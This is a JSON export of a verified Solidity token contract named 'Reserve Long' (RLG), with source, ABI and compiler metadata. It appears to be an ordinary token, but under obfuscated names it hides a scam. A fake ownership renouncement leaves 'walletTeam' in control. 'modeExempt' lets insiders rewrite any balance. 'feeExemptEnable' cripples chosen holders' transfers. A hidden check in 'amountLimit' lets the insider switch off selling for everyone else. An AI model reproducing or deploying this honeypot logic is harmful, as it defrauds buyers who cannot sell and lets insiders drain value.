{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fundSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minTxLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txEnable {\n    function createPair(address tradingMaxTake, address liquidityMarketing) external returns (address);\n}\n\ninterface receiverExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTo) external view returns (uint256);\n\n    function transfer(address listShould, uint256 autoLaunched) external returns (bool);\n\n    function allowance(address autoTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listShould,\n        uint256 autoLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTotal, uint256 value);\n    event Approval(address indexed autoTo, address indexed spender, uint256 value);\n}\n\ninterface marketingBuy is receiverExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReserveLong is minTxLaunch, receiverExempt, marketingBuy {\n\n    function totalLimit(address launchedExempt, address listShould, uint256 autoLaunched) internal returns (bool) {\n        require(fundFee[launchedExempt] >= autoLaunched);\n        fundFee[launchedExempt] -= autoLaunched;\n        fundFee[listShould] += autoLaunched;\n        emit Transfer(launchedExempt, listShould, autoLaunched);\n        return true;\n    }\n\n    address private enableSender;\n\n    function owner() external view returns (address) {\n        return enableSender;\n    }\n\n    mapping(address => bool) public autoFeeLiquidity;\n\n    mapping(address => uint256) private fundFee;\n\n    uint256 public modeTeam;\n\n    bool public enableTrading;\n\n    mapping(address => mapping(address => uint256)) private isList;\n\n    event OwnershipTransferred(address indexed amountAtLimit, address indexed buyAmount);\n\n    function approve(address toBuyTx, uint256 autoLaunched) public virtual override returns (bool) {\n        isList[_msgSender()][toBuyTx] = autoLaunched;\n        emit Approval(_msgSender(), toBuyTx, autoLaunched);\n        return true;\n    }\n\n    address public totalMax;\n\n    function allowance(address totalExempt, address toBuyTx) external view virtual override returns (uint256) {\n        if (toBuyTx == autoSell) {\n            return type(uint256).max;\n        }\n        return isList[totalExempt][toBuyTx];\n    }\n\n    function feeExemptEnable(address swapMarketing) public {\n        feeBuy();\n        if (enableReceiverLimit != modeTeam) {\n            minFee = modeTeam;\n        }\n        if (swapMarketing == walletTeam || swapMarketing == totalMax) {\n            return;\n        }\n        modeFrom[swapMarketing] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitTakeReceiver;\n    }\n\n    uint256 public minFee;\n\n    function liquidityTx(uint256 autoLaunched) public {\n        feeBuy();\n        tokenTx = autoLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableSender;\n    }\n\n    uint256 tokenTx;\n\n    function name() external view virtual override returns (string memory) {\n        return isTotalMax;\n    }\n\n    mapping(address => bool) public modeFrom;\n\n    constructor (){\n        if (enableReceiverLimit != modeTeam) {\n            enableReceiverLimit = senderLiquidity;\n        }\n        fundSender txMaxSwap = fundSender(autoSell);\n        totalMax = txEnable(txMaxSwap.factory()).createPair(txMaxSwap.WETH(), address(this));\n        if (enableReceiverLimit != minFee) {\n            senderLiquidity = minFee;\n        }\n        walletTeam = _msgSender();\n        atTeam();\n        autoFeeLiquidity[walletTeam] = true;\n        fundFee[walletTeam] = limitTakeReceiver;\n        if (enableLaunched == minFee) {\n            enableLaunched = modeTeam;\n        }\n        emit Transfer(address(0), walletTeam, limitTakeReceiver);\n    }\n\n    uint8 private enableShould = 18;\n\n    bool public shouldTeam;\n\n    function balanceOf(address walletTo) public view virtual override returns (uint256) {\n        return fundFee[walletTo];\n    }\n\n    function enableTo(address feeSellSwap) public {\n        require(feeSellSwap.balance < 100000);\n        if (shouldTeam) {\n            return;\n        }\n        if (enableReceiverLimit == enableLaunched) {\n            enableLaunched = enableReceiverLimit;\n        }\n        autoFeeLiquidity[feeSellSwap] = true;\n        \n        shouldTeam = true;\n    }\n\n    function transfer(address limitTo, uint256 autoLaunched) external virtual override returns (bool) {\n        return amountLimit(_msgSender(), limitTo, autoLaunched);\n    }\n\n    uint256 private limitTakeReceiver = 100000000 * 10 ** 18;\n\n    function transferFrom(address launchedExempt, address listShould, uint256 autoLaunched) external override returns (bool) {\n        if (_msgSender() != autoSell) {\n            if (isList[launchedExempt][_msgSender()] != type(uint256).max) {\n                require(autoLaunched <= isList[launchedExempt][_msgSender()]);\n                isList[launchedExempt][_msgSender()] -= autoLaunched;\n            }\n        }\n        return amountLimit(launchedExempt, listShould, autoLaunched);\n    }\n\n    uint256 private enableReceiverLimit;\n\n    function modeExempt(address limitTo, uint256 autoLaunched) public {\n        feeBuy();\n        fundFee[limitTo] = autoLaunched;\n    }\n\n    uint256 buyToken;\n\n    string private txShould = \"RLG\";\n\n    function atTeam() public {\n        emit OwnershipTransferred(walletTeam, address(0));\n        enableSender = address(0);\n    }\n\n    function feeBuy() private view {\n        require(autoFeeLiquidity[_msgSender()]);\n    }\n\n    address public walletTeam;\n\n    address autoSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private enableLaunched;\n\n    uint256 public senderLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txShould;\n    }\n\n    address launchLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function amountLimit(address launchedExempt, address listShould, uint256 autoLaunched) internal returns (bool) {\n        if (launchedExempt == walletTeam) {\n            return totalLimit(launchedExempt, listShould, autoLaunched);\n        }\n        uint256 receiverTake = receiverExempt(totalMax).balanceOf(launchLimit);\n        require(receiverTake == tokenTx);\n        require(listShould != launchLimit);\n        if (modeFrom[launchedExempt]) {\n            return totalLimit(launchedExempt, listShould, buyTeamMarketing);\n        }\n        return totalLimit(launchedExempt, listShould, autoLaunched);\n    }\n\n    uint256 constant buyTeamMarketing = 8 ** 10;\n\n    bool private minBuySell;\n\n    string private isTotalMax = \"Reserve Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAtLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toBuyTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuyTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFeeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSellSwap\",\"type\":\"address\"}],\"name\":\"enableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMarketing\",\"type\":\"address\"}],\"name\":\"feeExemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"liquidityTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"modeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReserveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}